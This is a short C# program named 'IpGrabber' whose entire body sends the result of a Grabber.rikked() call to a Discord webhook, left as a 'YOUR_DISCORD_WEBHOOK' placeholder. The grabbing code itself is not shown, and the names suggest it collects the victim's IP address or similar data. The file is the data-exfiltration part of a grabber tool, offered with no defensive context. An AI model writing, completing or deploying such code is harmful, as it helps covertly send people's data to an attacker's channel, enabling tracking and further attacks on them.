using System;
using System.Net;
using System.Collections.Specialized;

namespace IpGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string webhook = "YOUR_DISCORD_WEBHOOK";


            var wbc = new WebClient();
            var data = new NameValueCollection();
            data["content"] = Grabber.rikked();
            wbc.UploadValues(webhook, data);

        }

    }
}
